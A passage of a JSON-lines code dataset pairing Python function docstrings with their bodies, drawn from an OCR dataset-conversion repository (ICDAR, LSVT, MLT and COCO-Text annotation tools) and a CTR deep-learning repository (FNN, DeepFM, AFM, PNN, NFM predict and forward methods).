1000 == 0:\n        writeCache(env, cache)\n        cache = {}\n        print('Written %d / %d' % (cnt, nSamples))\n    cnt += 1\nnSamples = cnt - 1\ncache['num-samples'] = str(nSamples)\nwriteCache(env, cache)\nenv.close()\nprint('Created dataset with %d samples' % nSamples)", "path": "dataset\\convert_det2lmdb.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5c06icdar2015\u683c\u5f0f\u7684gt\u8f6c\u6362\u4e3ajson\u683c\u5f0f\n:param gt_path:\n:param save_path:\n:return:\n\"\"\"\n", "func_signal": "def cvt(gt_path, save_path, img_folder):\n", "code": "gt_dict = {'data_root': img_folder}\ndata_list = []\nfor file_path in tqdm(get_file_list(gt_path, p_postfix=['.txt'])):\n    content = load(file_path)\n    file_path = pathlib.Path(file_path)\n    img_name = file_path.name.replace('.txt', '.jpg')\n    cur_gt = {'img_name': img_name, 'annotations': []}\n    for line in content:\n        cur_line_gt = {'polygon': [], 'text': '', 'illegibility': False, 'language': 'Latin'}\n        chars_gt = [{'polygon': [], 'char': '', 'illegibility': False, 'language': 'Latin'}]\n        cur_line_gt['chars'] = chars_gt\n        line = line.split(',')\n        # \u5b57\u7b26\u4e32\u7ea7\u522b\u7684\u4fe1\u606f\n        x1, y1, x2, y2, x3, y3, x4, y4 = list(map(float, line[:8]))\n        cur_line_gt['polygon'] = [[x1, y1], [x2, y2], [x3, y3], [x4, y4]]\n        cur_line_gt['text'] = line[-1]\n        cur_line_gt['illegibility'] = True if cur_line_gt['text'] == '*' or cur_line_gt['text'] == '###' else False\n        cur_gt['annotations'].append(cur_line_gt)\n    data_list.append(cur_gt)\ngt_dict['data_list'] = data_list\nsave(gt_dict, save_path)", "path": "convert\\det\\MTWI20182json.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying anns\n:return: anns (object array) : loaded ann objects\n\"\"\"\n", "func_signal": "def loadAnns(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.anns[id] for id in ids]\nelif type(ids) == int:\n    return [self.anns[ids]]", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "# \u83b7\u53d6\u5750\u6807\u70b9\uff0c\u5e76\u5c06\u5b83\u4eec\u5206\u79bb\u5f00\u6765\n", "func_signal": "def four_point_transform(image, pts):\n", "code": "rect = original_coordinate_transformation(pts)\n(tl, tr, br, bl) = rect\n\n# \u8ba1\u7b97\u65b0\u56fe\u7247\u7684\u5bbd\u5ea6\u503c\uff0c\u9009\u53d6\u6c34\u5e73\u5dee\u503c\u7684\u6700\u5927\u503c\nwidthA = np.sqrt(((br[0] - bl[0]) ** 2) + ((br[1] - bl[1]) ** 2))\nwidthB = np.sqrt(((tr[0] - tl[0]) ** 2) + ((tr[1] - tl[1]) ** 2))\nmaxWidth = max(int(widthA), int(widthB))\n\n# \u8ba1\u7b97\u65b0\u56fe\u7247\u7684\u9ad8\u5ea6\u503c\uff0c\u9009\u53d6\u5782\u76f4\u5dee\u503c\u7684\u6700\u5927\u503c\nheightA = np.sqrt(((tr[0] - br[0]) ** 2) + ((tr[1] - br[1]) ** 2))\nheightB = np.sqrt(((tl[0] - bl[0]) ** 2) + ((tl[1] - bl[1]) ** 2))\nmaxHeight = max(int(heightA), int(heightB))\n\n# \u6784\u5efa\u65b0\u56fe\u7247\u76844\u4e2a\u5750\u6807\u70b9\ndst = np.array([\n    [0, 0],\n    [maxWidth - 1, 0],\n    [maxWidth - 1, maxHeight - 1],\n    [0, maxHeight - 1]], dtype=\"float32\")\n\n# \u83b7\u53d6\u4eff\u5c04\u53d8\u6362\u77e9\u9635\u5e76\u5e94\u7528\u5b83\nM = cv2.getPerspectiveTransform(rect, dst)\n# \u8fdb\u884c\u4eff\u5c04\u53d8\u6362\nwarped = cv2.warpPerspective(image, M, (maxWidth, maxHeight))\n\n# \u8fd4\u56de\u53d8\u6362\u540e\u7684\u7ed3\u679c\nreturn warped", "path": "convert\\crop_rec.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5c06icdar2015\u683c\u5f0f\u7684gt\u8f6c\u6362\u4e3ajson\u683c\u5f0f\n:param gt_path:\n:param save_path:\n:return:\n\"\"\"\n", "func_signal": "def cvt(gt_path, save_path, img_folder):\n", "code": "gt_dict = {'data_root': img_folder}\ndata_list = []\norigin_gt = load(gt_path)\nfor img_name, gt in tqdm(origin_gt.items()):\n    cur_gt = {'img_name': img_name + '.jpg', 'annotations': []}\n    for line in gt:\n        cur_line_gt = {'polygon': [], 'text': '', 'illegibility': False, 'language': 'Latin'}\n        chars_gt = [{'polygon': [], 'char': '', 'illegibility': False, 'language': 'Latin'}]\n        cur_line_gt['chars'] = chars_gt\n        # \u5b57\u7b26\u4e32\u7ea7\u522b\u7684\u4fe1\u606f\n        cur_line_gt['polygon'] = line['points']\n        cur_line_gt['text'] = line['transcription']\n        cur_line_gt['illegibility'] = line['illegibility']\n        cur_gt['annotations'].append(cur_line_gt)\n    data_list.append(cur_gt)\ngt_dict['data_list'] = data_list\nsave(gt_dict, save_path)", "path": "convert\\det\\LSVT2json.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "'''\nGet img ids that satisfy given filter conditions.\n:param imgIds (int array) : get imgs for given ids\n:param catIds (int array) : get imgs with all given cats\n:return: ids (int array)  : integer array of img ids\n'''\n", "func_signal": "def getImgIds(self, imgIds=[], catIds=[]):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == 0:\n    ids = list(self.imgs.keys())\nelse:\n    ids = set(imgIds)\n    if not len(catIds) == 0:\n        ids  = ids.intersection(set([self.anns[annid]['image_id'] for annid in self.getAnnByCat(catIds)]))\nreturn list(ids)", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nPrint information about the annotation file.\n:return:\n\"\"\"\n", "func_signal": "def info(self):\n", "code": "for key, value in self.dataset['info'].items():\n    print('%s: %s'%(key, value))", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "# \u521d\u59cb\u5316\u5750\u6807\u70b9\n", "func_signal": "def order_points(pts):\n", "code": "rect = np.zeros((4, 2), dtype=\"float32\")\n# \u83b7\u53d6\u5de6\u4e0a\u89d2\u548c\u53f3\u4e0b\u89d2\u5750\u6807\u70b9\ns = pts.sum(axis=1)\nrect[0] = pts[np.argmin(s)]\nrect[2] = pts[np.argmax(s)]\n# \u5206\u522b\u8ba1\u7b97\u5de6\u4e0a\u89d2\u548c\u53f3\u4e0b\u89d2\u7684\u79bb\u6563\u5dee\u503c\ndiff = np.diff(pts, axis=1)\nrect[1] = pts[np.argmin(diff)]\nrect[3] = pts[np.argmax(diff)]\nreturn rect", "path": "convert\\crop_rec.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5c06icdar2015\u683c\u5f0f\u7684gt\u8f6c\u6362\u4e3ajson\u683c\u5f0f\n:param gt_path:\n:param save_path:\n:return:\n\"\"\"\n", "func_signal": "def cvt(gt_path, save_path, img_folder):\n", "code": "gt_dict = {'data_root': img_folder}\ndata_list = []\nfor file_path in tqdm(get_file_list(gt_path, p_postfix=['.txt'])):\n    content = load(file_path)\n    file_path = pathlib.Path(file_path)\n    img_name = file_path.name.replace('.txt', '.jpg')\n    cur_gt = {'img_name': img_name, 'annotations': []}\n    for line in content:\n        cur_line_gt = {'polygon': [], 'text': '', 'illegibility': False, 'language': 'Latin'}\n        chars_gt = [{'polygon': [], 'char': '', 'illegibility': False, 'language': 'Latin'}]\n        cur_line_gt['chars'] = chars_gt\n        line = line.split(',')\n        lang = line[8]\n        cur_line_gt['language'] = lang\n        chars_gt[0]['language'] = lang\n        # \u5b57\u7b26\u4e32\u7ea7\u522b\u7684\u4fe1\u606f\n        x1, y1, x2, y2, x3, y3, x4, y4 = list(map(float, line[:8]))\n        cur_line_gt['polygon'] = [[x1, y1], [x2, y2], [x3, y3], [x4, y4]]\n        cur_line_gt['text'] = line[-1]\n        cur_line_gt['illegibility'] = True if cur_line_gt['text'] == '*' or cur_line_gt['text'] == '###' else False\n        cur_gt['annotations'].append(cur_line_gt)\n    data_list.append(cur_gt)\ngt_dict['data_list'] = data_list\nsave(gt_dict, save_path)", "path": "convert\\det\\mlt20192json.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nDisplay the specified annotations.\n:param anns (array of object): annotations to display\n:return: None\n\"\"\"\n", "func_signal": "def showAnns(self, anns, show_mask=False):\n", "code": "if len(anns) == 0:\n    return 0\nax = plt.gca()\nboxes = []\ncolor = []\nfor ann in anns:\n    c = np.random.random((1, 3)).tolist()[0]\n    if show_mask:\n        verts = list(zip(*[iter(ann['mask'])] * 2)) + [(0, 0)]\n        codes = [Path.MOVETO] + [Path.LINETO] * (len(verts) - 2) + [Path.CLOSEPOLY]\n        path = Path(verts, codes)\n        patch = PathPatch(path, facecolor='none')\n        boxes.append(patch)\n        text_x, text_y = verts[0]\n    else:\n        left, top, width, height = ann['bbox']\n        boxes.append(Rectangle([left,top],width,height,alpha=0.4))\n        text_x, text_y = left, top\n    color.append(c)\n    if 'utf8_string' in list(ann.keys()):\n        ax.annotate(ann['utf8_string'],(text_x, text_y-4),color=c)\np = PatchCollection(boxes, facecolors=color, edgecolors=(0,0,0,1), linewidths=3, alpha=0.4)\nax.add_collection(p)", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u4ecejson\u6587\u4ef6\u4e2d\u8bfb\u53d6\u51fa \u6587\u672c\u884c\u7684\u5750\u6807\u548cgt\uff0c\u5b57\u7b26\u7684\u5750\u6807\u548cgt\n:param json_path:\n:return:\n\"\"\"\n", "func_signal": "def load_gt(json_path):\n", "code": "content = load(json_path)\nd = {}\nfor gt in content['data_list']:\n    img_path = os.path.join(content['data_root'], gt['img_name'])\n    polygons = []\n    texts = []\n    illegibility_list = []\n    language_list = []\n    for annotation in gt['annotations']:\n        if len(annotation['polygon']) == 0:\n            continue\n        polygons.append(annotation['polygon'])\n        texts.append(annotation['text'])\n        illegibility_list.append(annotation['illegibility'])\n        language_list.append(annotation['language'])\n        for char_annotation in annotation['chars']:\n            if len(char_annotation['polygon']) == 0 or len(char_annotation['char']) == 0:\n                continue\n            polygons.append(char_annotation['polygon'])\n            texts.append(char_annotation['char'])\n            illegibility_list.append(char_annotation['illegibility'])\n            language_list.append(char_annotation['language'])\n    d[img_path] = {'polygons': polygons, 'texts': texts, 'illegibility_list': illegibility_list,\n                   'language_list': language_list}\nreturn d", "path": "convert\\utils.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nGet ann ids that satisfy given filter conditions. default skips that filter\n:param imgIds  (int array)     : get anns for given imgs\n       catIds  (list of tuples of the form [(category type, category)] e.g., [('readability','readable')] \n        : get anns for given cats\n       areaRng (float array)   : get anns for given area range (e.g. [0 inf])\n:return: ids (int array)       : integer array of ann ids\n\"\"\"\n", "func_signal": "def getAnnIds(self, imgIds=[], catIds=[], areaRng=[]):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == len(areaRng) == 0:\n    anns = list(self.anns.keys())\nelse:\n    if not len(imgIds) == 0:\n        anns = sum([self.imgToAnns[imgId] for imgId in imgIds if imgId in self.imgToAnns],[])\n    else:\n        anns = list(self.anns.keys())\n    anns = anns if len(catIds)  == 0 else list(set(anns).intersection(set(self.getAnnByCat(catIds))))\n    anns = anns if len(areaRng) == 0 else [ann for ann in anns if self.anns[ann]['area'] > areaRng[0] and self.anns[ann]['area'] < areaRng[1]]\nreturn anns", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5c06icdar2015\u683c\u5f0f\u7684gt\u8f6c\u6362\u4e3ajson\u683c\u5f0f\n:param gt_path:\n:param save_path:\n:return:\n\"\"\"\n", "func_signal": "def cvt(gt_path, save_path, img_folder):\n", "code": "gt_dict = {'data_root': img_folder}\ndata_list = []\nfor file_path in tqdm(get_file_list(gt_path, p_postfix=['.txt'])):\n    content = load(file_path)\n    file_path = pathlib.Path(file_path)\n    img_name = file_path.name.replace('gt_', '').replace('.txt', '.jpg')\n    cur_gt = {'img_name': img_name, 'annotations': []}\n    for line in content:\n        cur_line_gt = {'polygon': [], 'text': '', 'illegibility': False, 'language': 'Latin'}\n        chars_gt = [{'polygon': [], 'char': '', 'illegibility': False, 'language': 'Latin'}]\n        cur_line_gt['chars'] = chars_gt\n        line = line.split(',')\n        # \u5b57\u7b26\u4e32\u7ea7\u522b\u7684\u4fe1\u606f\n        x1, y1, x2, y2, x3, y3, x4, y4 = list(map(float, line[:8]))\n        cur_line_gt['polygon'] = [[x1, y1], [x2, y2], [x3, y3], [x4, y4]]\n        cur_line_gt['text'] = line[-1]\n        cur_line_gt['illegibility'] = True if cur_line_gt['text'] == '*' or cur_line_gt['text'] == '###' else False\n        cur_gt['annotations'].append(cur_line_gt)\n    data_list.append(cur_gt)\ngt_dict['data_list'] = data_list\nsave(gt_dict, save_path)", "path": "convert\\det\\icdar20152json.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5c06\u4e00\u4e2alist\u7684\u6570\u7ec4\u5199\u5165txt\u6587\u4ef6\u91cc\n:param data:\n:param file_path:\n:return:\n\"\"\"\n", "func_signal": "def save_txt(data, file_path):\n", "code": "if not isinstance(data, list):\n    data = [data]\nwith open(file_path, mode='w', encoding='utf8') as f:\n    f.write('\\n'.join(data))", "path": "convert\\utils.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "# create index\n", "func_signal": "def createIndex(self):\n", "code": "print('creating index...')\nself.imgToAnns = {int(cocoid): self.dataset['imgToAnns'][cocoid] for cocoid in self.dataset['imgToAnns']}\nself.imgs      = {int(cocoid): self.dataset['imgs'][cocoid] for cocoid in self.dataset['imgs']}\nself.anns      = {int(annid): self.dataset['anns'][annid] for annid in self.dataset['anns']}\nself.cats      = self.dataset['cats']\nself.val       = [int(cocoid) for cocoid in self.dataset['imgs'] if self.dataset['imgs'][cocoid]['set'] == 'val']\nself.test      = [int(cocoid) for cocoid in self.dataset['imgs'] if self.dataset['imgs'][cocoid]['set'] == 'test']\nself.train     = [int(cocoid) for cocoid in self.dataset['imgs'] if self.dataset['imgs'][cocoid]['set'] == 'train']\nprint('index created!')", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying img\n:return: imgs (object array) : loaded img objects\n\"\"\"\n", "func_signal": "def loadImgs(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.imgs[id] for id in ids]\nelif type(ids) == int:\n    return [self.imgs[ids]]", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n\u5728\u56fe\u7247\u4e0a\u7ed8\u5236 \u6587\u672c\u6846\u548c\u6587\u672c\n:param image:\n:param polygons: \u6587\u672c\u6846\n:param txt: \u6587\u672c\n:param color: \u7ed8\u5236\u7684\u989c\u8272\n:param font_path: \u5b57\u4f53\n:return:\n\"\"\"\n", "func_signal": "def show_bbox_on_image(image, polygons=None, txt=None, color=None, font_path='convert/simsun.ttc'):\n", "code": "from PIL import ImageDraw, ImageFont\nimage = image.convert('RGB')\ndraw = ImageDraw.Draw(image)\nif len(txt) == 0:\n    txt = None\nif color is None:\n    color = (255, 0, 0)\nif txt is not None:\n    font = ImageFont.truetype(font_path, 20)\nfor i, box in enumerate(polygons):\n    if txt is not None:\n        draw.text((int(box[0][0]) + 20, int(box[0][1]) - 20), str(txt[i]), fill='red', font=font)\n    for j in range(len(box) - 1):\n        draw.line((box[j][0], box[j][1], box[j + 1][0], box[j + 1][1]), fill=color, width=5)\n    draw.line((box[-1][0], box[-1][1], box[0][0], box[0][1]), fill=color, width=5)\nreturn image", "path": "convert\\utils.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nConstructor of COCO-Text helper class for reading and visualizing annotations.\n:param annotation_file (str): location of annotation file\n:return:\n\"\"\"\n# load dataset\n", "func_signal": "def __init__(self, annotation_file=None):\n", "code": "self.dataset = {}\nself.anns = {}\nself.imgToAnns = {}\nself.catToImgs = {}\nself.imgs = {}\nself.cats = {}\nself.val = []\nself.test = []\nself.train = []\nif not annotation_file == None:\n    assert os.path.isfile(annotation_file), \"file does not exist\"\n    print('loading annotations into memory...')\n    time_t = datetime.datetime.utcnow()\n    dataset = json.load(open(annotation_file, 'r'))\n    print(datetime.datetime.utcnow() - time_t)\n    self.dataset = dataset\n    self.createIndex()", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\nLoad result file and return a result api object.\n:param   resFile (str)     : file name of result file\n:return: res (obj)         : result api object\n\"\"\"\n", "func_signal": "def loadRes(self, resFile):\n", "code": "res = COCO_Text()\nres.dataset['imgs'] = [img for img in self.dataset['imgs']]\n\nprint('Loading and preparing results...     ')\ntime_t = datetime.datetime.utcnow()\nif type(resFile) == str:\n    anns = json.load(open(resFile))\nelse:\n    anns = resFile\nassert type(anns) == list, 'results in not an array of objects'\nannsImgIds = [int(ann['image_id']) for ann in anns]\n\nif set(annsImgIds) != (set(annsImgIds) & set(self.getImgIds())):\n    print('Results do not correspond to current coco set')\n    print('skipping ', str(len(set(annsImgIds)) - len(set(annsImgIds) & set(self.getImgIds()))), ' images')\nannsImgIds = list(set(annsImgIds) & set(self.getImgIds()))\n\nres.imgToAnns = {cocoid : [] for cocoid in annsImgIds}\nres.imgs = {cocoid: self.imgs[cocoid] for cocoid in annsImgIds}\n\nassert anns[0]['bbox'] != [], 'results have incorrect format'\nfor id, ann in enumerate(anns):\n    if ann['image_id'] not in annsImgIds:\n        continue\n    bb = ann['bbox']\n    ann['area'] = bb[2]*bb[3]\n    ann['id'] = id\n    res.anns[id] = ann\n    res.imgToAnns[ann['image_id']].append(id)\nprint('DONE (t=%0.2fs)'%((datetime.datetime.utcnow() - time_t).total_seconds()))\n\nreturn res", "path": "convert\\det\\coco_text.py", "repo_name": "WenmuZhou/OCR_DataSet", "stars": 738, "license": "None", "language": "python", "size": 9422}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict_proba(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn pred.data.numpy()", "path": "model\\AFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\FNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict_proba(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn pred.data.numpy()", "path": "model\\FNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict_proba(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn pred.data.numpy()", "path": "model\\PNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\DeepFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: the same as fit function\n:param Xv: the same as fit function\n:return: output, ont-dim array\n\"\"\"\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "Xi = np.array(Xi).reshape((-1,self.field_size,1))\nXi = Variable(torch.LongTensor(Xi))\nXv = Variable(torch.FloatTensor(Xv))\nif self.use_cuda and torch.cuda.is_available():\n    Xi, Xv = Xi.cuda(), Xv.cuda()\n\nmodel = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\NFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\AFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict_proba(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn pred.data.numpy()", "path": "model\\DeepFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:param y: tensor of labels\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.inner_predict_proba(Xi, Xv)\nreturn self.eval_metric(y.cpu().data.numpy(), y_pred)", "path": "model\\FNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: index input tensor, batch_size * k * 1\n:param Xv: value input tensor, batch_size * k * 1\n:param is_pretrain: the para to decide fm pretrain or not\n:return: the last output\n\"\"\"\n", "func_signal": "def forward(self, Xi, Xv):\n", "code": "if self.pretrain and self.use_fm:\n    fm_first_order_emb_arr = [(torch.sum(emb(Xi[:,i,:]),1).t()*Xv[:,i]).t() for i, emb in enumerate(self.fm_first_order_embeddings)]\n    fm_first_order_sum = torch.sum(sum(fm_first_order_emb_arr),1)\n    fm_second_order_emb_arr = [(torch.sum(emb(Xi[:,i,:]),1).t()*Xv[:,i]).t() for i, emb in enumerate(self.fm_second_order_embeddings)]\n    fm_sum_second_order_emb = sum(fm_second_order_emb_arr)\n    fm_sum_second_order_emb_square = fm_sum_second_order_emb*fm_sum_second_order_emb # (x+y)^2\n    fm_second_order_emb_square = [item*item for item in fm_second_order_emb_arr]\n    fm_second_order_emb_square_sum = sum(fm_second_order_emb_square) #x^2+y^2\n    fm_second_order = (fm_sum_second_order_emb_square - fm_second_order_emb_square_sum) * 0.5\n    fm_second_order_sum = torch.sum(fm_second_order,1)\n    return self.fm_bias+fm_first_order_sum+fm_second_order_sum\nelif self.pretrain and self.use_ffm:\n    ffm_first_order_emb_arr = [(torch.sum(emb(Xi[:,i,:]),1).t()*Xv[:,i]).t() for i, emb in enumerate(self.ffm_first_order_embeddings)]\n    sum_ = torch.sum(sum(ffm_first_order_emb_arr),1)\n    ffm_second_order_emb_arr = [[(torch.sum(emb(Xi[:,i,:]), 1).t() * Xv[:,i]).t() for emb in  f_embs] for i, f_embs in enumerate(self.ffm_second_order_embeddings)]\n    for i in range(self.field_size):\n        for j in range(i+1, self.field_size):\n            sum_ += torch.sum((ffm_second_order_emb_arr[i][j]*ffm_second_order_emb_arr[j][i]),1)\n    return self.ffm_bias + sum_\nelif not self.pretrain and self.use_fm:\n    fm_first_order_emb_arr = [(torch.sum(emb(Xi[:,i,:]),1).t()*Xv[:,i]).t() for i, emb in enumerate(self.fm_first_order_embeddings)]\n    fm_second_order_emb_arr = [(torch.sum(emb(Xi[:, i, :]), 1).t() * Xv[:, i]).t() for i, emb in enumerate(self.fm_second_order_embeddings)]\n    fm_first_order = torch.cat(fm_first_order_emb_arr,1)\n    fm_second_order = torch.cat(fm_second_order_emb_arr,1)\n    if self.use_cuda:\n        fm_bias = self.fm_bias * Variable(torch.ones(Xi.data.shape[0],1)).cuda()\n    else:\n        fm_bias = self.fm_bias * Variable(torch.ones(Xi.data.shape[0], 1))\n    deep_emb = torch.cat([fm_bias,fm_first_order,fm_second_order],1)\n    if self.deep_layers_activation == 'sigmoid':\n        activation = F.sigmoid\n    elif self.deep_layers_activation == 'tanh':\n        activation = F.tanh\n    else:\n        activation = F.relu\n    if self.is_deep_dropout:\n        deep_emb = self.linear_0_dropout(deep_emb)\n    x_deep = self.linear_1(deep_emb)\n    if self.is_batch_norm:\n        x_deep = self.batch_norm_1(x_deep)\n    x_deep = activation(x_deep)\n    if self.is_deep_dropout:\n        x_deep = self.linear_1_dropout(x_deep)\n    for i in range(1, len(self.deep_layers)):\n        x_deep = getattr(self, 'linear_' + str(i + 1))(x_deep)\n        if self.is_batch_norm:\n            x_deep = getattr(self, 'batch_norm_' + str(i + 1))(x_deep)\n        x_deep = activation(x_deep)\n        if self.is_deep_dropout:\n            x_deep = getattr(self, 'linear_' + str(i + 1) + '_dropout')(x_deep)\n    x_deep = self.deep_last_layer(x_deep)\n    return torch.sum(x_deep,1)\nelse:\n    ffm_first_order_emb_arr = [(torch.sum(emb(Xi[:, i, :]), 1).t() * Xv[:, i]).t() for i, emb in enumerate(self.ffm_first_order_embeddings)]\n    ffm_second_order_emb_arr = [torch.cat([(torch.sum(emb(Xi[:, i, :]), 1).t() * Xv[:, i]).t() for emb in f_embs],1) for\n                                i, f_embs in enumerate(self.ffm_second_order_embeddings)]\n    ffm_first_order = torch.cat(ffm_first_order_emb_arr,1)\n    ffm_second_order = torch.cat(ffm_second_order_emb_arr,1)\n    if self.use_cuda:\n        ffm_bias = self.ffm_bias * Variable(torch.ones(Xi.data.shape[0], 1)).cuda()\n    else:\n        ffm_bias = self.ffm_bias * Variable(torch.ones(Xi.data.shape[0], 1))\n    deep_emb = torch.cat([ffm_bias, ffm_first_order, ffm_second_order], 1)\n    if self.deep_layers_activation == 'sigmoid':\n        activation = F.sigmoid\n    elif self.deep_layers_activation == 'tanh':\n        activation = F.tanh\n    else:\n        activation = F.relu\n    if self.is_deep_dropout:\n        deep_emb = self.linear_0_dropout(deep_emb)\n    x_deep = self.linear_1(deep_emb)\n    if self.is_batch_norm:\n        x_deep = self.batch_norm_1(x_deep)\n    x_deep = activation(x_deep)\n    if self.is_deep_dropout:\n        x_deep = self.linear_1_dropout(x_deep)\n    for i in range(1, len(self.deep_layers)):\n        x_deep = getattr(self, 'linear_' + str(i + 1))(x_deep)\n        if self.is_batch_norm:\n            x_deep = getattr(self, 'batch_norm_' + str(i + 1))(x_deep)\n        x_deep = activation(x_deep)\n        if self.is_deep_dropout:\n            x_deep = getattr(self, 'linear_' + str(i + 1) + '_dropout')(x_deep)\n    x_deep = self.deep_last_layer(x_deep)\n    return torch.sum(x_deep,1)", "path": "model\\FNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:param y: tensor of labels\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.inner_predict_proba(Xi, Xv)\nreturn self.eval_metric(y.cpu().data.numpy(), y_pred)", "path": "model\\DeepFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
